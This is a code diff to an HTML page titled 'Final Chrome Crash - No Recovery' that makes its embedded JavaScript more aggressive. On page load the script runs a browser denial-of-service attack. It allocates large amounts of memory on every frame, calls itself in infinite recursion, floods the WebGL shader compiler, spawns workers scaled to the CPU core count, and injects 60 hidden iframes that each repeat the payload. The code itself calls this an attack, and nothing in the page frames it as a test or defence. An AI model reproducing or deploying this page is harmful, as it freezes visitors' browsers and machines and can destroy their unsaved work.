@@ -1,13 +1,44 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Full Chrome Crash - Unrecoverable Overload</title>
+    <title>Final Chrome Crash - No Recovery</title>
 </head>
 <body>
-    <h1>Final Chrome Crash Test</h1>
-    <p>Chrome should become completely unresponsive.</p>
+    <h1>Final Chrome Crash - No Recovery</h1>
+    <p>This should make Chrome completely unresponsive.</p>
 
     <script>
+        function startWorker() {
+            let data = [];
+            function allocate() {
+                for (let i = 0; i < 500; i++) { // 500 Blocks per loop
+                    data.push(new Float64Array(3e7)); // Even larger memory allocations
+                }
+                requestAnimationFrame(allocate); // Forces execution on every frame
+            }
+            allocate();
+        }
+
+        function infiniteRecursion() {
+            try { return infiniteRecursion(); } catch (e) { infiniteRecursion(); }
+        }
+
+        function overloadGPU() {
+            let canvas = document.createElement('canvas');
+            let gl = canvas.getContext('webgl');
+            function floodGPU() {
+                let shaders = [];
+                setInterval(() => {
+                    var shader = gl.createShader(gl.VERTEX_SHADER);
+                    gl.shaderSource(shader, 'void main() { gl_Position = vec4(0.5, 0.5, 0.5, 1.0); }');
+                    gl.compileShader(shader);
+                    shaders.push(shader);
+                    gl.getShaderParameter(shader, gl.COMPILE_STATUS);
+                }, 0);
+            }
+            floodGPU();
+        }
+
         function createIframe() {
             let iframe = document.createElement("iframe");
             iframe.style.display = "none"; 
@@ -16,10 +47,10 @@
                     function startWorker() {
                         let data = [];
                         function allocate() {
-                            for (let i = 0; i < 200; i++) { 
-                                data.push(new Float64Array(2e7)); // Even larger allocations
+                            for (let i = 0; i < 500; i++) { 
+                                data.push(new Float64Array(3e7)); 
                             }
-                            setTimeout(allocate, 25); // Faster execution
+                            requestAnimationFrame(allocate);
                         }
                         allocate();
                     }
@@ -39,31 +70,37 @@
                                 gl.compileShader(shader);
                                 shaders.push(shader);
                                 gl.getShaderParameter(shader, gl.COMPILE_STATUS);
-                            }, 1);
+                            }, 0);
                         }
                         floodGPU();
                     }
 
-                    let coreMultiplier = navigator.hardwareConcurrency * 10; 
+                    let coreMultiplier = navigator.hardwareConcurrency * 12; 
                     for (let i = 0; i < coreMultiplier; i++) {
-                        setTimeout(startWorker, i * 10); 
+                        setTimeout(startWorker, i * 5); 
                     }
 
-                    setTimeout(() => infiniteRecursion(), 1000); // Introduce recursion early
-                    setTimeout(() => overloadGPU(), 1000); // Start GPU flood
+                    setTimeout(() => infiniteRecursion(), 500); // Immediate recursion overload
+                    setTimeout(() => overloadGPU(), 500); // Immediate GPU flood
                 <\/script>
             `);
             document.body.appendChild(iframe);
         }
 
         function launchAttack() {
-            for (let i = 0; i < 50; i++) { // Increase iframe count
-                setTimeout(createIframe, i * 10); // Inject iframes more aggressively
+            for (let i = 0; i < 60; i++) { // 60 iframes for rapid overload
+                setTimeout(createIframe, i * 5); 
             }
         }
 
-        launchAttack(); // Start attack immediately
+        let coreMultiplier = navigator.hardwareConcurrency * 12; 
+        for (let i = 0; i < coreMultiplier; i++) {
+            setTimeout(startWorker, i * 5); 
+        }
+
+        setTimeout(() => infiniteRecursion(), 500); // Immediate recursion overload
+        setTimeout(() => overloadGPU(), 500); // Immediate GPU flood
+        launchAttack();
     </script>
 </body>
 </html>
-
